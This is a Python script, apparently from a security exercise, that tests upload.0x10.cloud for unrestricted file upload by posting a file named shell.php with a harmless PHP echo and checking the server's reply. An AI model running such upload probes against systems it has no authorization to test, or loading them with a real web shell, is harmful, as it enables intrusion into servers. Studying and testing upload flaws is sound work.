# ============================================================
#  VULNERABILITY: Unrestricted file type to Upload
#  Target: upload.0x10.cloud
#  Author: [Mohamed Amine OUATAR]
# ============================================================

# Unrestricted File Upload occurs when a web application 
# allows users to upload files without validating their type,
# extension or content.
# 
# This allows attackers to:
# - Upload malicious scripts (.php, .js.. ect)
# - Store dangerous files on the server
# - Potentially execute code if the server is misconfigured
# - Use the server to distribute malware
# 
# In this case, the upload feature on upload.0x10.cloud is 
# vulnerable. The server:
# - Accepts all file type (including .php)
# - Does not validate file extensions
# - confirms "No file type restrictions applied"
#
# Even though uploaded files may not be directly executable, 
# accepting dangerous file types is a serious security risk.
#
# Technique: 
# Upload a malicious file (test.html or shell.php) using 
# a post request, then analyze the server response forL
# - Successful upload confirmation
# - Lack of file validation
# - Acceptance of dangerous extensions 
# ============================================================

import urllib.request
import time

print("=" * 50)
print(" Unrestricted File Upload Tester")
print("=" * 50)

# --- Configuration ---
url = "https://upload.0x10.cloud"

# Malicious test file (PHP)
file_content = "<?php echo 'HACKED'; ?>"
filename = "shell.php"

# Boundary for multipart request
boundary = "FormBoundary"

# Build request body 
body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
    f"Content-Type: application/x-php\r\n\r\n"
    f"{file_content}\r\n"
    f"--{boundary}--\r\n"
).encode()

data = body

headers = {
    "Content-type": f"multipart/form-data; boundary={boundary}"
}

try:
    time.sleep(0.15) #respect server rate limit

    request = urllib.request.Request(url, data=data, headers=headers)
    response = urllib.request.urlopen(request, timeout=5)
    html_code = response.read().decode("utf-8")

    print("\n [1] Uploading malicious file...")

    # --- Analyse response ---
    found = False

    if "File uploaded successfully" in html_code:
        print("    [-] File upload accepted by server.")
        found = True

    if "shell.php" in html_code:
        print("    [-] .php file correctly received by the server.")
        found = True

    if "No file type restrictions" in html_code:
        print("    [-] No file type validation detected.")
        found = True

    if ".php" in html_code:
        print("    [-] Dangerous file extensions (.php) accepted.")

    # --- Final result ---
    if found:
        print("\n [!] VULNERABILITY FOUND")
        print("    [-] The server allows unrestrected file uploads.")
        print("    [-] Attackers can upload dangerous files (.php).")
    else:
        print("\n  [OK] No vulnerability detected.")

except Exception as e:
    print(f"\n [ERROR] Request failed: {e}")

print("\n" + "=" * 50)